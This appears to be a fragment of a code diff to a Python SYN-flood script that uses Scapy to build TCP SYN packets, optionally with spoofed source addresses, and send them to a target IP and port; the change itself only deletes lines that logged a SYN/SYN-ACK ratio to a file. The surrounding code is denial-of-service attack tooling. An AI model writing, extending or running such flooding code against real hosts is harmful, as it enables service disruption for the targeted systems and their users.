@@ -38,11 +38,6 @@ def flood(src_net: str, dst_ip: str, dst_port: int, sleep: int, spoof_ip=True):
                     IP(dst=dst_ip)
             transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")
             print (str(s_counter) + "  " + str(sa_counter))
-            f= open("g.txt","w+")
-            rate =0 
-            if (s_counter > 0): rate = sa_counter/s_counter
-            f.write("rate = %f\r\n" % rate)
-            f.close() 
             # Send the packet
             try:
                 send(network_layer/transport_layer, verbose=False)
